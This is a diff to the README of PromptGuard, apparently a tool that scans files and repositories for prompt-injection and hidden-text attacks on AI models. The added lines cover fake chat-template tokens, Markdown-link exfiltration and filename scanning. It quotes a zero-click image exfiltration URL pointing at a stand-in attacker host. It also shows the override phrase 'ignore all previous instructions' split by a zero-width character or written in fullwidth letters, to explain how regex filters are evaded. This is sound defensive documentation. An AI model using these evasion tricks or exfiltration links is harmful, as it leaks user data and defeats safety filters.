@@ -68,18 +68,22 @@ The generated `dist/PromptGuard.exe` can be distributed and run with a double-cl
 
 | Severity | Examples |
 |---|---|
-| **CRITICAL** | Credential exfiltration, system prompt override, prompt reveal, exfiltration via templated image URLs |
-| **HIGH** | Jailbreak (DAN mode, developer mode), impersonation, code execution, tool/function-calling injection |
+| **CRITICAL** | Credential exfiltration, system prompt override, prompt reveal, exfiltration via templated image URLs, fake chat-template tokens (`<\|im_start\|>`, `[INST]`) |
+| **HIGH** | Jailbreak (DAN mode, developer mode), impersonation, code execution, tool/function-calling injection, exfiltration via templated Markdown links, fake role/context-boundary markers |
 | **MEDIUM** | Subtle manipulation, hidden iframes/scripts, javascript: links, fake conversation roles |
 | **LOW** | Secrecy indicators ("don't tell the user", "en secreto") |
 
-**Steganographic analysis:** acrostics, diagonal patterns, hidden base64, zero-width characters, Unicode Tags (ASCII smuggling), bidirectional control characters (Trojan Source), Unicode homoglyphs, hidden comments.
+**Steganographic analysis:** acrostics, diagonal patterns, hidden base64/hex/URL-encoding/ROT13, zero-width characters, Unicode Tags (ASCII smuggling), bidirectional control characters (Trojan Source), Unicode homoglyphs (Cyrillic/Greek/fullwidth/mathematical alphanumeric), hidden comments.
 
-Three vectors worth calling out:
+**Filename scanning:** the filename itself is checked against the same pattern set -- instructions can be smuggled in a file or PR name, not just its content.
+
+Vectors worth calling out:
 
 - **ASCII smuggling** — an entire prompt encoded in the Unicode Tags block (`U+E0000`–`U+E007F`), which renders as nothing at all. The scanner decodes the payload and reports it.
 - **Trojan Source** — bidirectional control characters (`U+202A`–`U+202E`, `U+2066`–`U+2069`) that make source render differently than it parses (CVE-2021-42574).
 - **Zero-click image exfiltration** — `![](https://attacker/log?d={DATA})` or an equivalent `<img>` tag, where simply rendering the response leaks data. Plain external images are not flagged; only templated URLs and data-carrying query parameters are.
+- **Zero-width regex evasion** — an attacker can insert a zero-width character inside a keyword (`ign​ore all previous instructions`) to slip past a `\s+`-based regex. The scanner re-runs every pattern against a version of the content with zero-width/Unicode Tag characters stripped, and flags anything that only matches after stripping as `evasion_zero_width_bypass` (critical).
+- **Homoglyphs beyond Cyrillic/Greek** — fullwidth forms (`ｉｇｎｏｒｅ`) and Mathematical Alphanumeric Symbols (bold/italic/script variants) are detected generically via NFKC normalization, not a fixed lookup table.
 
 Patterns work in **English and Spanish**.
 
@@ -170,7 +174,7 @@ The scanner is organized in 5 internal modules within a single file:
 | Module | Responsibility |
 |---|---|
 | **Direct Pattern Scanner** | Regex-based detection across 4 severity tiers |
-| **Steganographic Analysis** | Acrostics, diagonals, base64, zero-width chars, Unicode Tags, bidi controls, homoglyphs, hidden comments |
+| **Steganographic Analysis** | Acrostics, diagonals, base64/hex/URL-encoding/ROT13, zero-width chars, Unicode Tags, bidi controls, homoglyphs (incl. fullwidth/math-alphanumeric), hidden comments |
 | **Input Sources** | Local directory traversal and GitHub shallow clone |
 | **Scoring & Reporting** | 0-100 scoring, classification, JSON report generation |
 | **CLI & Interactive** | Argument parsing, interactive menu, colored output |
